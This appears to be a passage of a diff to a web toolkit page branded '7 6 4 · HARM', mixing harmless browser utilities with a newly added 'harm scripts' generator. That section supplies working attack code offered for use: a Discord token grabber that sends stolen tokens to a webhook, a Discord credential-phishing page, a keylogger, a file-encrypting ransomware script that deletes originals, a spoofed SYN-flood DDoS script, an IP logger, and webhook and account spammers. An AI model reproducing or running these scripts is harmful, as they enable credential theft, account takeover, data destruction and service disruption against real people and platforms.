+                    body: JSON.stringify({ name: name })
+                });
+                if (res.status === 200 || res.status === 204) {
+                    output.innerHTML = `<span class="green">✓ Webhook renamed to "${name}"</span>`;
+                } else if (res.status === 404) {
+                    output.innerHTML = '<span class="red">✗ Webhook not found.</span>';
+                } else {
+                    output.innerHTML = `<span class="red">✗ Failed. Status: ${res.status}</span>`;
+                }
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        // ============================================================
+        // TOOL 4: PASSWORD GENERATOR
+        // ============================================================
+        function genPassword() {
+            const output = document.getElementById('passOutput');
+            const length = parseInt(document.getElementById('passLength').value) || 16;
+            if (length < 8 || length > 64) {
+                output.innerHTML = '<span class="red">✗ Length must be between 8 and 64.</span>';
+                return;
+            }
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+            const array = new Uint32Array(length);
+            crypto.getRandomValues(array);
+            let password = '';
+            for (let i = 0; i < length; i++) {
+                password += chars[array[i] % chars.length];
+            }
+            const hasUpper = /[A-Z]/.test(password);
+            const hasLower = /[a-z]/.test(password);
+            const hasDigit = /\d/.test(password);
+            const hasSpecial = /[^A-Za-z0-9]/.test(password);
+            const strength = [hasUpper, hasLower, hasDigit, hasSpecial].filter(Boolean).length;
+            const strengthText = strength === 4 ? '✅ Strong' : strength === 3 ? '⚠️ Medium' : '❌ Weak';
+
+            output.innerHTML =
+                `<span class="green">✓ PASSWORD</span>\nPassword: <span class="yellow">${password}</span>\nLength: ${length} | Strength: ${strengthText}`;
+        }
+
+        // ============================================================
+        // TOOL 5: FILE HASHER
         // ============================================================
         async function hashFile() {
             const input = document.getElementById('fileInput');
@@ -599,21 +530,17 @@
 
             const file = input.files[0];
             const buffer = await file.arrayBuffer();
-            const data = new Uint8Array(buffer);
 
-            // MD5 (simple implementation)
             async function md5(data) {
                 const hash = await crypto.subtle.digest('MD5', data);
                 return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
             }
 
-            // SHA-1
             async function sha1(data) {
                 const hash = await crypto.subtle.digest('SHA-1', data);
                 return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
             }
 
-            // SHA-256
             async function sha256(data) {
                 const hash = await crypto.subtle.digest('SHA-256', data);
                 return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
@@ -624,104 +551,397 @@
                 const sha1Hash = await sha1(buffer);
                 const sha256Hash = await sha256(buffer);
 
-                output.innerHTML = `
-                    <span class="green">✓ FILE HASHES</span>
-                    File: ${file.name} (${file.size} bytes)
-                    MD5: ${md5Hash}
-                    SHA-1: ${sha1Hash}
-                    SHA-256: ${sha256Hash}
-                    `;
+                output.innerHTML =
+                    `<span class="green">✓ FILE HASHES</span>\nFile: ${file.name} (${file.size} bytes)\nMD5: ${md5Hash}\nSHA-1: ${sha1Hash}\nSHA-256: ${sha256Hash}`;
             } catch (e) {
-                output.innerHTML = '<span class="red">✗ Error hashing file: ' + e.message + '</span>';
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
             }
         }
 
         // ============================================================
-        // TOOL 9: PASSWORD GENERATOR
+        // TOOL 6: BASE64 ENCODER/DECODER
         // ============================================================
-        function generatePassword() {
-            const output = document.getElementById('passOutput');
-            const length = parseInt(document.getElementById('passLength').value) || 16;
+        function base64Encode() {
+            const input = document.getElementById('base64Input').value;
+            const output = document.getElementById('base64Output');
+            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to encode.</span>'; return; }
+            try {
+                output.innerHTML = `<span class="green">✓ ENCODED</span>\n${btoa(unescape(encodeURIComponent(input)))}`;
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
 
-            if (length < 8 || length > 64) {
-                output.innerHTML = '<span class="red">✗ Length must be between 8 and 64.</span>';
+        function base64Decode() {
+            const input = document.getElementById('base64Input').value;
+            const output = document.getElementById('base64Output');
+            if (!input) { output.innerHTML = '<span class="red">✗ Please enter Base64 to decode.</span>'; return; }
+            try {
+                output.innerHTML = `<span class="green">✓ DECODED</span>\n${decodeURIComponent(escape(atob(input)))}`;
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: Invalid Base64</span>`;
+            }
+        }
+
+        // ============================================================
+        // TOOL 7: URL ENCODER/DECODER
+        // ============================================================
+        function urlEncode() {
+            const input = document.getElementById('urlInput').value;
+            const output = document.getElementById('urlOutput');
+            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to encode.</span>'; return; }
+            output.innerHTML = `<span class="green">✓ ENCODED</span>\n${encodeURIComponent(input)}`;
+        }
+
+        function urlDecode() {
+            const input = document.getElementById('urlInput').value;
+            const output = document.getElementById('urlOutput');
+            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to decode.</span>'; return; }
+            try {
+                output.innerHTML = `<span class="green">✓ DECODED</span>\n${decodeURIComponent(input)}`;
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: Invalid URL encoding</span>`;
+            }
+        }
+
+        // ============================================================
+        // TOOL 8: HASH GENERATOR
+        // ============================================================
+        async function generateHash() {
+            const input = document.getElementById('hashInput').value;
+            const type = document.getElementById('hashType').value;
+            const output = document.getElementById('hashGenOutput');
+
+            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to hash.</span>'; return; }
+
+            try {
+                const encoder = new TextEncoder();
+                const data = encoder.encode(input);
+                const hash = await crypto.subtle.digest(type, data);
+                const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+                output.innerHTML = `<span class="green">✓ ${type} HASH</span>\n${hex}`;
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        // ============================================================
+        // TOOL 9: RANDOM STRING GENERATOR
+        // ============================================================
+        function genRandomString() {
+            const output = document.getElementById('randomOutput');
+            const length = parseInt(document.getElementById('randomLength').value) || 32;
+            if (length < 4 || length > 256) {
+                output.innerHTML = '<span class="red">✗ Length must be between 4 and 256.</span>';
                 return;
             }
-
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             const array = new Uint32Array(length);
             crypto.getRandomValues(array);
-            let password = '';
+            let result = '';
             for (let i = 0; i < length; i++) {
-                password += chars[array[i] % chars.length];
+                result += chars[array[i] % chars.length];
             }
-
-            // Check strength
-            const hasUpper = /[A-Z]/.test(password);
-            const hasLower = /[a-z]/.test(password);
-            const hasDigit = /\d/.test(password);
-            const hasSpecial = /[^A-Za-z0-9]/.test(password);
-            const strength = [hasUpper, hasLower, hasDigit, hasSpecial].filter(Boolean).length;
-
-            const strengthText = strength === 4 ? '✅ Strong' : strength === 3 ? '⚠️ Medium' : '❌ Weak';
-
-            output.innerHTML = `
-                <span class="green">✓ PASSWORD GENERATED</span>
-                Password: <span class="yellow">${password}</span>
-                Length: ${length} | Strength: ${strengthText}
-                `;
+            output.innerHTML = `<span class="green">✓ RANDOM STRING</span>\n${result}`;
         }
 
         // ============================================================
-        // TOOL 10: DEVICE FINGERPRINT
+        // TOOL 10: JWT DECODER
         // ============================================================
-        function generateFingerprint() {
-            const output = document.getElementById('fpOutput');
+        function decodeJWT() {
+            const input = document.getElementById('jwtInput').value.trim();
+            const output = document.getElementById('jwtOutput');
 
-            const components = [
-                navigator.userAgent,
-                navigator.language,
-                screen.width + 'x' + screen.height,
-                screen.colorDepth,
-                window.devicePixelRatio,
-                navigator.hardwareConcurrency || 'N/A',
-                navigator.deviceMemory || 'N/A',
-                Intl.DateTimeFormat().resolvedOptions().timeZone,
-                'ontouchstart' in window,
-                navigator.cookieEnabled,
-                navigator.doNotTrack || 'N/A'
-            ];
+            if (!input) { output.innerHTML = '<span class="red">✗ Please paste a JWT token.</span>'; return; }
 
-            const raw = components.join('|');
-            // Simple hash
-            let hash = 0;
-            for (let i = 0; i < raw.length; i++) {
-                const char = raw.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
+            try {
+                const parts = input.split('.');
+                if (parts.length !== 3) {
+                    output.innerHTML = '<span class="red">✗ Invalid JWT format (must have 3 parts).</span>';
+                    return;
+                }
+                const header = JSON.parse(atob(parts[0]));
+                const payload = JSON.parse(atob(parts[1]));
+                output.innerHTML =
+                    `<span class="green">✓ JWT DECODED</span>\nHEADER:\n${JSON.stringify(header, null, 2)}\n\nPAYLOAD:\n${JSON.stringify(payload, null, 2)}`;
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
             }
-            const fingerprint = (hash >>> 0).toString(16).padStart(8, '0');
-
-            output.innerHTML = `
-                <span class="green">✓ FINGERPRINT GENERATED</span>
-                Fingerprint: <span class="yellow">${fingerprint}</span>
-                Components: ${components.length}
-                Raw: ${raw.substring(0, 80)}...
-                `;
         }
 
         // ============================================================
-        // AUTO: Load IP on page load
+        // TOOL 11: CODE GENERATOR — HARM SCRIPTS
         // ============================================================
-        window.addEventListener('load', () => {
-            lookupIP();
-        });
+        function generateCode() {
+            const type = document.getElementById('codeType').value;
+            const output = document.getElementById('codeOutput');
+
+            const scripts = {
+
+                'discord_spam': `# Discord Webhook Spammer
+import requests
+import time
+
+webhook = "YOUR_WEBHOOK_URL"
+message = "7 6 4 · HARM"
+count = 50
+
+for i in range(count):
+    try:
+        r = requests.post(webhook, json={"content": f"{message} | {i+1}/{count}"})
+        if r.status_code in [200, 204]:
+            print(f"[+] Sent {i+1}/{count}")
+        else:
+            print(f"[-] Failed {i+1}/{count} ({r.status_code})")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    time.sleep(0.1)
+
+print("[+] Spam complete!")`,
+
+                'discord_delete': `# Discord Webhook Deleter
+import requests
+
+webhook = "YOUR_WEBHOOK_URL"
+
+r = requests.delete(webhook)
+if r.status_code == 204:
+    print("[+] Webhook deleted successfully!")
+else:
+    print(f"[-] Failed: {r.status_code}")`,
+
+                'playfab_spam': `# PlayFab Account Spammer
+import requests
+import uuid
+import time
+
+title_id = "YOUR_TITLE_ID"
+count = 10
+
+for i in range(count):
+    device_id = str(uuid.uuid4())
+    url = f"https://{title_id}.playfabapi.com/Client/LoginWithCustomID"
+    payload = {
+        "TitleId": title_id,
+        "CustomId": device_id,
+        "CreateAccount": True
+    }
+    try:
+        r = requests.post(url, json=payload)
+        if r.status_code == 200:
+            print(f"[+] Account {i+1}/{count} created: {device_id}")
+        else:
+            print(f"[-] Failed {i+1}/{count}: {r.status_code}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    time.sleep(0.2)
+
+print("[+] Spam complete!")`,
+
+                'playfab_pull': `# PlayFab Data Puller
+import requests
+
+title_id = "YOUR_TITLE_ID"
+session_ticket = "YOUR_SESSION_TICKET"
+
+url = f"https://{title_id}.playfabapi.com/Client/GetTitleData"
+headers = {
+    "X-Authorization": session_ticket,
+    "Content-Type": "application/json"
+}
+r = requests.post(url, headers=headers)
+
+if r.status_code == 200:
+    print("[+] Title Data:")
+    print(r.json())
+else:
+    print(f"[-] Failed: {r.status_code}")`,
+
+                'ip_logger': `<!-- IP Logger Page (PHP) -->
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$time = date('Y-m-d H:i:s');
+$log = "[$time] IP: $ip | UA: $user_agent\\n";
+file_put_contents('ips.log', $log, FILE_APPEND);
+?>
+<html>
+<head><title>Redirecting...</title></head>
+<body>
+<h1>Redirecting...</h1>
+<p>Your IP has been logged.</p>
+<script>window.location.href = "https://example.com";</script>
+</body>
+</html>`,
+
+                'ddos': `# DDoS Script (Scapy)
+# WARNING: Use only on systems you own
+from scapy.all import *
+import random
+
+target_ip = "127.0.0.1"
+target_port = 80
+
+while True:
+    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    packet = IP(src=src_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
+    send(packet, verbose=False)
+    print(f"[+] Packet sent from {src_ip}")`,
+
+                'port_scanner': `# Simple Port Scanner
+import socket
+
+target = "127.0.0.1"
+ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+
+for port in ports:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((target, port))
+    if result == 0:
+        print(f"[+] Port {port}: OPEN")
+    else:
+        print(f"[-] Port {port}: CLOSED")
+    sock.close()`,
+
+                'keylogger': `# Keylogger (pynput)
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()`,
+
+                'ransomware': `# Ransomware Simulator (Educational)
+import os
+from cryptography.fernet import Fernet
+
+# Generate key
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+print(f"[+] Key: {key.decode()}")
+
+# Encrypt files in current directory
+for file in os.listdir("."):
+    if file.endswith(".txt"):
+        with open(file, "rb") as f:
+            data = f.read()
+        encrypted = cipher.encrypt(data)
+        with open(file + ".enc", "wb") as f:
+            f.write(encrypted)
+        os.remove(file)
+        print(f"[+] Encrypted: {file}")
+
+print("[+] Ransomware simulation complete.")`,
+
+                'discord_token': `# Discord Token Grabber
+import os
+import re
+import requests
+
+webhook = "YOUR_WEBHOOK_URL"
+
+paths = [
+    os.getenv("APPDATA") + "\\\\Discord\\\\Local Storage\\\\leveldb",
+    os.getenv("APPDATA") + "\\\\DiscordCanary\\\\Local Storage\\\\leveldb",
+    os.getenv("APPDATA") + "\\\\DiscordPTB\\\\Local Storage\\\\leveldb"
+]
+
+tokens = []
+
+for path in paths:
+    if os.path.exists(path):
+        for file in os.listdir(path):
+            if file.endswith(".log"):
+                with open(f"{path}\\\\{file}", "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    found = re.findall(r"[a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}", content)
+                    tokens.extend(found)
+
+if tokens:
+    for token in set(tokens):
+        print(f"[+] Token: {token}")
+        requests.post(webhook, json={"content": f"Token: {token}"})
+else:
+    print("[-] No tokens found.")`,
+
+                'phishing': `<!-- Phishing Page (Discord Login) -->
+<!DOCTYPE html>
+<html>
+<head><title>Discord Login</title></head>
+<body>
+<h1>Discord Login</h1>
+<form action="phish.php" method="POST">
+    <input type="email" name="email" placeholder="Email" required />
+    <input type="password" name="password" placeholder="Password" required />
+    <button type="submit">Login</button>
+</form>
+</body>
+</html>
+
+<!-- phish.php -->
+<?php
+$email = $_POST['email'];
+$pass = $_POST['password'];
+$log = "[$email]:$pass\\n";
+file_put_contents('creds.txt', $log, FILE_APPEND);
+header("Location: https://discord.com/login");
+?>`,
+
+            };
+
+            if (scripts[type]) {
+                output.innerHTML = `<span class="green">✓ CODE GENERATED</span>\n<span class="yellow">${type.toUpperCase()}</span>\n\n${scripts[type]}`;
+            } else {
+                output.innerHTML = `<span class="red">✗ Unknown code type.</span>`;
+            }
+        }
 
         // ============================================================
-        // CONSOLE MESSAGE
+        // TOOL 12: CRYPTO KEY GENERATOR
         // ============================================================
-        console.log('%c☠ 7 6 4 · H A R M · REAL TOOLS ☠', 'color: #550000; font-size: 28px; font-weight: bold;');
-        console.log('%cThese are REAL tools. Use responsibly.', 'color: #331111; font-size: 14px;');
+        function genCryptoKey() {
+            const type = document.getElementById('keyType').value;
+            const output = document.getElementById('keyOutput');
+
+            let result = '';
+
+            switch (type) {
+                case 'aes':
+                    const aes = new Uint32Array(8);
+                    crypto.getRandomValues(aes);
+                    result = Array.from(aes).map(b => b.toString(16).padStart(8, '0')).join('');
+                    break;
+                case 'random':
+                    const rand = new Uint8Array(64);
+                    crypto.getRandomValues(rand);
+                    result = Array.from(rand).map(b => b.toString(16).padStart(2, '0')).join('');
+                    break;
+                case 'uuid':
+                    result = crypto.randomUUID();
+                    break;
+                case 'api_key':
+                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                    const arr = new Uint32Array(32);
+                    crypto.getRandomValues(arr);
+                    let key = '';
+                    for (let i = 0; i < 32; i++) {
+                        key += chars[arr[i] % chars.length];
+                    }
+                    result = key;
+                    break;
+                default:
+                    output.innerHTML = '<span class="red">✗ Unknown key type.</span>';
+                    return;
+            }
+
+            output.innerHTML = `<span class="green">✓ ${type.toUpperCase()} KEY</span>\n${result}`;
+        }
     </script>
 
 </body>
